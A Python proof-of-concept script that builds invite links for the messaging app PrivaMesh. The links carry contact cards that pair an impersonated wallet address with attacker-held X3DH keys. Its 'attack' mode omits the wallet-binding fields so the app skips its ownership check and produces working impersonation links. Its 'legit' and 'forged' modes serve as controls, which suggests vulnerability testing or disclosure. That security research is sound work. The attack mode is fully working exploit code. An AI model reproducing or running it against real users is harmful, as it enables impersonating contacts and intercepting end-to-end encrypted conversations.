#!/usr/bin/env python3
"""Build invite links whose cards carry a chosen wallet address next to
attacker-controlled X3DH keys.

Three modes, all byte-compatible with the app's own encoder
(ContactCard -> JSON -> raw DEFLATE -> base64 -> base64url):

  attack   unsigned bundle, card address = the address being impersonated.
           No wallet-binding fields at all, so the app's binding check is
           never evaluated.
  legit    bundle signed by a wallet that really owns its address. Must be
           ACCEPTED — proves the pipeline is not rejecting everything.
  forged   bundle claims the impersonated address but is signed by a key that
           does not own it. Must be REJECTED — proves the guard does run.

Usage:
  gen_attack_link.py attack <impersonated_base58> [nickname]
  gen_attack_link.py legit  <ignored> [nickname]
  gen_attack_link.py forged <impersonated_base58> [nickname]
  add --json for machine-readable output.
"""

import base64
import json
import sys
import zlib

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ed25519, x25519

ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"


def b58encode(raw: bytes) -> str:
    n = int.from_bytes(raw, "big")
    out = ""
    while n > 0:
        n, rem = divmod(n, 58)
        out = ALPHABET[rem] + out
    pad = len(raw) - len(raw.lstrip(b"\x00"))
    return "1" * pad + out


def raw_deflate(data: bytes) -> bytes:
    """Raw DEFLATE: no 0x78 header, no Adler-32 trailer.

    Apple's NSData.compressed(using: .zlib) emits exactly this. A zlib-wrapped
    stream fails NSData.decompressed on device.
    """
    co = zlib.compressobj(9, zlib.DEFLATED, -15)
    return co.compress(data) + co.flush()


def b64url(s: str) -> str:
    return s.replace("+", "-").replace("/", "_").replace("=", "")


def b64(b: bytes) -> str:
    return base64.b64encode(b).decode()


def raw_pub(k) -> bytes:
    return k.public_key().public_bytes(
        serialization.Encoding.Raw, serialization.PublicFormat.Raw)


def raw_priv(k) -> bytes:
    return k.private_bytes(
        serialization.Encoding.Raw, serialization.PrivateFormat.Raw,
        serialization.NoEncryption())


def make_keys():
    ik = x25519.X25519PrivateKey.generate()
    spk = x25519.X25519PrivateKey.generate()
    sig_ik = ed25519.Ed25519PrivateKey.generate()
    return ik, spk, sig_ik


def bundle_dict(ik, spk, sig_ik, wallet_address=None, wallet_signature=None):
    spk_pub = raw_pub(spk)
    b = {
        "dhIdentityKey": b64(raw_pub(ik)),
        "signedPrekeyPublic": b64(spk_pub),
        "signedPrekeySignature": b64(sig_ik.sign(spk_pub)),
        "signingIdentityKey": b64(raw_pub(sig_ik)),
    }
    if wallet_address is not None and wallet_signature is not None:
        b["walletAddress"] = wallet_address
        b["walletSignature"] = b64(wallet_signature)
    return b


def canonical_bytes(b: dict) -> bytes:
    """Mirror of PrekeyBundle.canonicalBytes.

    dhIdentityKey || signedPrekeyPublic || signedPrekeySignature
                  || [oneTimePrekeyPublic] || signingIdentityKey || [pqPrekeyPublic]
    """
    d = b""
    d += base64.b64decode(b["dhIdentityKey"])
    d += base64.b64decode(b["signedPrekeyPublic"])
    d += base64.b64decode(b["signedPrekeySignature"])
    if "oneTimePrekeyPublic" in b:
        d += base64.b64decode(b["oneTimePrekeyPublic"])
    d += base64.b64decode(b["signingIdentityKey"])
    if "pqPrekeyPublic" in b:
        d += base64.b64decode(b["pqPrekeyPublic"])
    return d


def encode_card(address: str, bundle: dict, nickname: str) -> dict:
    bundle_json = json.dumps(bundle, separators=(",", ":")).encode()
    card = {
        "v": 1,
        "address": address,
        "bundle": b64(bundle_json),
        "profile": {
            "nickname": nickname,
            "bio": "",
            "nicknames": [],
            "avatars": [],
            "listings": [],
            "isPremium": False,
        },
    }
    card_json = json.dumps(card, separators=(",", ":")).encode()
    deflated = raw_deflate(card_json)
    payload = b64url(b64(deflated))
    return {
        "card_json_bytes": len(card_json),
        "deflate_bytes": len(deflated),
        "deflate_first_byte": f"0x{deflated[0]:02x}",
        "payload_chars": len(payload),
        "payload": payload,
        "web_link": f"https://privamesh.org/i/{payload}",
        "app_link": f"privamesh://add?c={payload}",
    }


def build(mode: str, target: str, nickname: str) -> dict:
    ik, spk, sig_ik = make_keys()
    out = {"mode": mode, "nickname": nickname}

    if mode == "attack":
        bundle = bundle_dict(ik, spk, sig_ik)
        address = target
        out["expect"] = "accepted"
        out["why"] = "no walletAddress field, so the binding check is skipped"

    elif mode == "legit":
        wallet = ed25519.Ed25519PrivateKey.generate()
        address = b58encode(raw_pub(wallet))
        probe = bundle_dict(ik, spk, sig_ik)
        sig = wallet.sign(canonical_bytes(probe))
        bundle = bundle_dict(ik, spk, sig_ik, address, sig)
        out["expect"] = "accepted"
        out["why"] = "wallet signature verifies against the card address"

    elif mode == "forged":
        wallet = ed25519.Ed25519PrivateKey.generate()
        probe = bundle_dict(ik, spk, sig_ik)
        sig = wallet.sign(canonical_bytes(probe))
        bundle = bundle_dict(ik, spk, sig_ik, target, sig)
        address = target
        out["expect"] = "rejected"
        out["why"] = "claims the address but is signed by a different wallet"

    else:
        raise SystemExit(f"unknown mode: {mode}")

    card = encode_card(address, bundle, nickname)
    out.update(card)
    out["address"] = address
    out["bundle_has_wallet_fields"] = "walletAddress" in bundle
    out["attacker_secrets"] = {
        "dh_identity_private": b64(raw_priv(ik)),
        "signed_prekey_private": b64(raw_priv(spk)),
        "signing_identity_private": b64(raw_priv(sig_ik)),
        "dh_identity_public": b64(raw_pub(ik)),
    }
    return out


if __name__ == "__main__":
    as_json = "--json" in sys.argv
    argv = [a for a in sys.argv[1:] if a != "--json"]
    if len(argv) < 2:
        print(__doc__)
        raise SystemExit(2)
    mode, target = argv[0], argv[1]
    nickname = argv[2] if len(argv) > 2 else "Alice"
    r = build(mode, target, nickname)

    if as_json:
        print(json.dumps(r, indent=2))
    else:
        print(f"mode                 : {r['mode']}  (expect {r['expect']})")
        print(f"card address         : {r['address']}")
        print(f"nickname in card     : {r['nickname']}")
        print(f"bundle has wallet fields: {r['bundle_has_wallet_fields']}")
        print(f"card JSON            : {r['card_json_bytes']} B")
        print(f"raw DEFLATE          : {r['deflate_bytes']} B, first byte {r['deflate_first_byte']}")
        print(f"payload              : {r['payload_chars']} chars")
        print(f"why                  : {r['why']}")
        print()
        print(f"app  : {r['app_link']}")
